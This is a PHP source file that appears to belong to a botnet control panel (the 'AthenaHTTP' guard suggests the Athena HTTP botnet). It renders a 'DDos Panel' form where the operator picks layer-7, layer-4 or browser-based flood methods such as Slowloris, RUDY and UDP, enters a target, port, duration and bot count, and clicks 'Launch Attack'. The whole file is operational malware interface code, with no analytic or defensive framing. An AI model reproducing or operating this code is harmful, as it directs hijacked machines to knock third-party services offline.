<?php

	if(!defined('AthenaHTTP')) header('Location: ..');

	$PAGE_INCLUDE = '';
	
	require_once './include/inc_ddos.php';
		
	if($STATUS_NOTE)
	{
		$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
		$PAGE_INCLUDE .= '				<span class="title"> </span>' . "\n";
		$PAGE_INCLUDE .= '				<p>' . "\n";
		$PAGE_INCLUDE .= '					' . $STATUS_MESSAGE . "\n";
		$PAGE_INCLUDE .= '				</p>' . "\n";
		$PAGE_INCLUDE .= '			</div>' . "\n";
	}
	
	$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
	$PAGE_INCLUDE .= '				<span class="title">DDos Panel</span>' . "\n";
	$PAGE_INCLUDE .= '				<form action="./index.php?p=ddos" method="POST">' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Attack Method:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right">' . "\n";
	$PAGE_INCLUDE .= '							<select name="ddos_type" onChange="changeLayout(this.selectedIndex);">' . "\n";
	$PAGE_INCLUDE .= '								<optgroup label="Layer 7">' . "\n";
	$PAGE_INCLUDE .= '									<option value="arme">ARME</option>' . "\n";
	$PAGE_INCLUDE .= '									<option value="bandwidth">Bandwidth</option>' . "\n";
	$PAGE_INCLUDE .= '									<option value="rapidget">Rapid GET</option>' . "\n";
	$PAGE_INCLUDE .= '									<option value="rapidpost">Rapid POST</option>' . "\n";
	$PAGE_INCLUDE .= '									<option value="rudy">RUDY</option>' . "\n";
	$PAGE_INCLUDE .= '									<option value="slowloris">Slowloris</option>' . "\n";
	$PAGE_INCLUDE .= '									<option value="slowpost">Slow POST</option>' . "\n";
	$PAGE_INCLUDE .= '									<option value="combo">Combo</option>' . "\n";
	$PAGE_INCLUDE .= '								</optgroup>' . "\n";
	$PAGE_INCLUDE .= '								<optgroup label="Layer 4">' . "\n";
	$PAGE_INCLUDE .= '									<option value="ecf">ECF</option>' . "\n";
	$PAGE_INCLUDE .= '									<option value="udp">UDP</option>' . "\n";	
	$PAGE_INCLUDE .= '								</optgroup>' . "\n";
	$PAGE_INCLUDE .= '								<optgroup label="Browser">' . "\n";
	$PAGE_INCLUDE .= '									<option value="browser">Browser Based</option>' . "\n";
	$PAGE_INCLUDE .= '								</optgroup>' . "\n";
	$PAGE_INCLUDE .= '								<optgroup label="Cancellation">' . "\n";
	$PAGE_INCLUDE .= '									<option value="browser.stop">Browser Based Attacks</option>' . "\n";
	$PAGE_INCLUDE .= '									<option value="stop">Layer4/Layer7 Based Attacks</option>' . "\n";
	$PAGE_INCLUDE .= '								</optgroup>' . "\n";
	$PAGE_INCLUDE .= '							</select>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p id="ddos_target">' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Target:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="ddos_target" type="text" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p id="ddos_port">' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Port:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="ddos_port" type="text" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p id="ddos_duration">' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Duration:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="ddos_duration" type="text" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p id="ddos_amount">' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Amount of Bots:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="ddos_amount" type="text" />' . "\n";
	$PAGE_INCLUDE .= '							<br />' . "\n";
	$PAGE_INCLUDE .= '							<span class="small">Leave this field empty for no limitation.</span>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<span class="foot">' . "\n";
	$PAGE_INCLUDE .= '						<input type="submit" value="Launch Attack" /> ' . "\n";
	$PAGE_INCLUDE .= '					</span>' . "\n";
	$PAGE_INCLUDE .= '				</form>' . "\n";
	$PAGE_INCLUDE .= '			</div>' . "\n";

?>